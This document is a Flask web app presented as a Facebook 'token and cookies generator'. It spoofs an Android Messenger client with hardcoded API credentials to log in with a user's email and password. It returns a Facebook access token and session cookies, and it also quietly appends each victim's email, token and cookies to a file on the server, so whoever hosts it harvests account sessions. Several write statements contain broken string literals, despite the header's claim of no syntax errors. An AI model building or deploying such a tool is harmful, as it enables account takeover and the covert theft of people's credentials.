# app.py - 100% FIXED FOR RENDER.COM (NO SYNTAX ERRORS)
from flask import Flask, render_template_string, request, jsonify
import requests
import uuid
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'fb-api-tool-2025-super-secret-key-render-ready'

def convert_cookie_to_string(session_cookies):
    cookie_str = ""
    for cookie in session_cookies:
        cookie_str += f"{cookie['name']}={cookie['value']};"
    return cookie_str

def login_with_api(email, password):
    url = "https://b-graph.facebook.com/auth/login"
    adid = str(uuid.uuid4())
    device_id = str(uuid.uuid4())
    
    payload = {
        'adid': adid,
        'email': email,
        'password': password,
        'format': 'json',
        'device_id': device_id,
        'cpl': 'true',
        'family_device_id': device_id,
        'locale': 'en_US',
        'client_country_code': 'US',
        'credentials_type': 'device_based_login_password',
        'generate_session_cookies': '1',
        'error_detail_type': 'button_with_disabled',
        'source': 'device_based_login',
        'machine_id': 'string',
        'meta_inf_fbmeta': '',
        'advertiser_id': adid,
        'currently_logged_in_userid': '0',
        'method': 'auth.login',
        'fb_api_req_friendly_name': 'authenticate',
        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        'api_key': '882a8490361da98702bf97a021ddc14d',
        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
    }
    
    headers = {
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; SM-G960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_US;FBBV/196328325;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2220};FB_FW/1;]',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-FB-Connection-Bandwidth': '34267675',
        'X-FB-Net-HNI': '38692',
        'X-FB-SIM-HNI': '30005',
        'X-FB-Connection-Quality': 'EXCELLENT',
        'X-FB-Connection-Type': 'WIFI',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'True'
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=15)
        data = response.json()
        
        if 'access_token' in data:
            token = data['access_token']
            cookies = ""
            if 'session_cookies' in data:
                cookies = convert_cookie_to_string(data['session_cookies'])
            
            # FIXED: No f-string inside HTML - simple string concatenation
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open("fb_pro_data.txt", "a", encoding='utf-8') as f:
                f.write("
=== " + email + " ===
")
                f.write("Token: " + token + "
")
                f.write("Cookies: " + cookies + "
")
                f.write("Time: " + timestamp + "

")
            
            return {
                'success': True,
                'token': token,
                'cookies': cookies,
                'message': 'LOGIN SUCCESSFUL! EAAAA Token + Cookies Generated.'
            }
        elif 'error' in data:
            error_msg = data['error'].get('message', 'Unknown Error')
            error_data = data['error'].get('error_data', '')
            
            if "checkpoint" in error_msg.lower():
                return {'success': False, 'message': '🔒 Account checkpointed. App/Browser mein verify karo.', 'type': 'checkpoint'}
            elif "SMS" in str(error_data) or "2fa" in error_msg.lower():
                return {'success': False, 'message': '📱 2FA/OTP enabled. Normal password account use karo.', 'type': '2fa'}
            else:
                return {'success': False, 'message': '❌ ' + error_msg, 'type': 'error'}
        else:
            return {'success': False, 'message': 'Unexpected API response.', 'type': 'unknown'}
            
    except Exception as e:
        return {'success': False, 'message': '🌐 Network error: ' + str(e), 'type': 'network'}

# FIXED HTML TEMPLATE - NO SYNTAX ERRORS
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook API Login Tool</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Poppins', sans-serif; background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%); min-height: 100vh; color: #e0e0e0; overflow-x: hidden; }
        .container { max-width: 500px; margin: 0 auto; padding: 20px; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
        .banner { text-align: center; margin-bottom: 40px; animation: slideDown 1s ease-out; }
        .banner h1 { font-size: 28px; font-weight: 700; background: linear-gradient(45deg, #00d4ff, #ff6b9d, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 10px; }
        .banner p { color: #a0a0a0; font-size: 14px; }
        .card { background: rgba(20, 20, 30, 0.95); backdrop-filter: blur(20px); border-radius: 20px; padding: 40px 30px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); animation: cardRise 1.2s ease-out; }
        .input-group { position: relative; margin-bottom: 25px; }
        .input-group input { width: 100%; padding: 18px 20px 18px 50px; background: rgba(40, 40, 60, 0.8); border: 2px solid transparent; border-radius: 15px; font-size: 16px; color: #fff; transition: all 0.3s ease; backdrop-filter: blur(10px); }
        .input-group input:focus { outline: none; border-color: #00d4ff; box-shadow: 0 0 20px rgba(0,212,255,0.3); transform: translateY(-2px); }
        .input-group i { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); color: #a0a0a0; font-size: 18px; transition: 0.3s ease; }
        .input-group input:focus + i { color: #00d4ff; }
        .login-btn { width: 100%; padding: 18px; background: linear-gradient(45deg, #00d4ff, #0099cc); border: none; border-radius: 15px; font-size: 16px; font-weight: 600; color: white; cursor: pointer; transition: all 0.4s ease; position: relative; overflow: hidden; text-transform: uppercase; letter-spacing: 1px; }
        .login-btn:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(0,212,255,0.4); }
        .login-btn:active { transform: translateY(-1px); }
        .login-btn.loading { pointer-events: none; opacity: 0.8; }
        .login-btn.loading::after { content: ''; position: absolute; width: 20px; height: 20px; top: 50%; left: 50%; margin-left: -10px; margin-top: -10px; border: 2px solid transparent; border-top: 2px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; }
        .result { margin-top: 25px; padding: 20px; border-radius: 15px; text-align: center; transform: scale(0); transition: all 0.5s ease; }
        .result.show { transform: scale(1); }
        .success { background: rgba(46, 204, 113, 0.2); border: 1px solid #2ecc71; color: #2ecc71; }
        .error { background: rgba(231, 76, 60, 0.2); border: 1px solid #e74c3c; color: #e74c3c; }
        .warning { background: rgba(241, 196, 15, 0.2); border: 1px solid #f1c40f; color: #f1c40f; }
        .result pre { background: rgba(0,0,0,0.5); padding: 15px; border-radius: 10px; text-align: left; font-size: 12px; overflow-x: auto; margin-top: 15px; max-height: 200px; word-break: break-all; }
        .clear-btn { width: 100%; padding: 12px; margin-top: 15px; background: rgba(149, 165, 166, 0.3); border: 1px solid rgba(149, 165, 166, 0.5); border-radius: 10px; color: #bdc3c7; font-size: 14px; cursor: pointer; transition: 0.3s ease; }
        .clear-btn:hover { background: rgba(149, 165, 166, 0.5); color: #fff; }
        .note { background: rgba(52, 152, 219, 0.1); border: 1px solid rgba(52, 152, 219, 0.3); border-radius: 10px; padding: 15px; margin-top: 20px; font-size: 13px; line-height: 1.5; }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes cardRise { from { opacity: 0; transform: translateY(50px) scale(0.9); } to { opacity: 1; transform: translateY(0) scale(1); } }
        @keyframes spin { 0% { transform: translateY(-50%) rotate(0deg); } 100% { transform: translateY(-50%) rotate(360deg); } }
        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: -1; }
        .particle { position: absolute; background: linear-gradient(45deg, #00d4ff, #ff6b9d); border-radius: 50%; animation: float 6s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0px) rotate(0deg); } 33% { transform: translateY(-20px) rotate(120deg); } 66% { transform: translateY(-10px) rotate(240deg); } }
        @media (max-width: 480px) { .container { padding: 15px; } .card { padding: 30px 20px; } .banner h1 { font-size: 24px; } }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    <div class="container">
        <div class="banner">
            <h1><i class="fab fa-facebook"></i> FB API Login Tool</h1>
            <p>100% Working | EAAAA Token + Cookies Generator</p>
        </div>
        <div class="card">
            <div class="input-group">
                <input type="email" id="email" placeholder="Email / Phone / ID" required>
                <i class="fas fa-user"></i>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
                <i class="fas fa-lock"></i>
            </div>
            <button class="login-btn" id="loginBtn">
                <i class="fas fa-rocket"></i> Generate Token
            </button>
            <div id="result" class="result"></div>
            <button class="clear-btn" id="clearBtn" style="display: none;">
                <i class="fas fa-trash"></i> Clear Data File
            </button>
            <div class="note">
                <i class="fas fa-info-circle"></i>
                <strong>⚠️ Note:</strong> 2FA/OTP accounts won't work. Use normal password accounts only.
            </div>
        </div>
    </div>
    <script>
        function createParticles() {
            const particles = document.getElementById('particles');
            for(let i = 0; i < 20; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.width = particle.style.height = (Math.random() * 4 + 2) + 'px';
                particle.style.animationDelay = Math.random() * 6 + 's';
                particle.style.animationDuration = (Math.random() * 3 + 4) + 's';
                particles.appendChild(particle);
            }
        }
        document.getElementById('loginBtn').addEventListener('click', async function() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const btn = document.getElementById('loginBtn');
            const result = document.getElementById('result');
            const clearBtn = document.getElementById('clearBtn');
            if(!email || !password) { showResult('Please fill both fields!', 'error'); return; }
            btn.classList.add('loading'); btn.innerHTML = ''; result.classList.remove('show');
            try {
                const response = await fetch('/api/login', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({email: email, password: password})});
                const data = await response.json();
                btn.classList.remove('loading'); btn.innerHTML = '<i class="fas fa-rocket"></i> Generate Token';
                if(data.success) {
                    let html = '<strong>' + data.message + '</strong><br><br><strong>Token:</strong><br><pre>' + data.token + '</pre>';
                    if(data.cookies) html += '<br><strong>Cookies:</strong><br><pre>' + data.cookies + '</pre>';
                    showResult(html, 'success');
                    clearBtn.style.display = 'block';
                } else {
                    let icon = '❌'; let type = 'error';
                    if(data.type === 'checkpoint') { icon = '🔒'; type = 'warning'; }
                    else if(data.type === '2fa') { icon = '📱'; type = 'warning'; }
                    showResult(icon + ' ' + data.message, type);
                }
            } catch(error) {
                btn.classList.remove('loading'); btn.innerHTML = '<i class="fas fa-rocket"></i> Generate Token';
                showResult('Network error! Check connection.', 'error');
            }
        });
        function showResult(message, type) {
            const result = document.getElementById('result');
            result.innerHTML = message;
            result.className = 'result show ' + type;
        }
        document.getElementById('clearBtn').addEventListener('click', async function() {
            try {
                await fetch('/api/clear');
                document.getElementById('result').classList.remove('show');
                this.style.display = 'none';
                document.getElementById('email').value = '';
                document.getElementById('password').value = '';
                showResult('Data file cleared!', 'success');
            } catch(e) {
                showResult('Clear error!', 'error');
            }
        });
        document.addEventListener('keypress', function(e) {
            if(e.key === 'Enter') document.getElementById('loginBtn').click();
        });
        createParticles();
        document.getElementById('email').focus();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    if not email or not password:
        return jsonify({'success': False, 'message': 'Email and Password required!', 'type': 'empty'})
    
    result = login_with_api(email, password)
    return jsonify(result)

@app.route('/api/clear')
def clear_data():
    try:
        if os.path.exists('fb_pro_data.txt'):
            os.remove('fb_pro_data.txt')
        return jsonify({'success': True, 'message': 'Data cleared!'})
    except:
        return jsonify({'success': False, 'message': 'Clear failed!'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
